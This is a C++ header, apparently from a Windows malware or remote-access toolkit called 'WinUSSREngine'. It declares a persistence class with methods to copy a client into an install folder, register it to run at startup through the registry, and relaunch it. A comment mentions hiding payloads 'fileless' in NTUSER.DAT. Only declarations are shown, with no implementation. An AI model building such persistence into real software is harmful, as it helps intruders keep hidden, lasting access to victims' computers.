#pragma once

/*
* 
* Old name was client anchors, calling it
* basic persist since it's a more fitting
* name as well as I can make it so that way
* the user of this API can make their shit
* "Fileless" (aka just have it exist in NTUSER.DAT)
* 
* Not through basic persist but through like RegMaster or whatever.
*/

#include <string>
#include <Windows.h>

namespace WinUSSREngine
{
	class BasicPersist

	{
	public:
		void Create();

		void RestartClientApp();
		void InstallClientAnchor();
		void RunInstalledClient();
		void StartProcess(LPCSTR lpAppName, LPSTR lpArg);
		bool SetAppStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);
	private:
		void InitClientAnchor();
		std::string GetCurrentPath();
		std::string GetInstallFolder();
		std::string GetInstallPath();
		bool IsClientAnchored();
		bool RegValueExists(HKEY, LPCSTR, LPCSTR);
	private:
		struct PersistData
		{
			std::string currentPath{};
			std::string installFolder{};
			std::string installPath{};
			bool isInstalling = false;
			LPSTR lpArgs{};
		};
		PersistData m_Data;
	};
}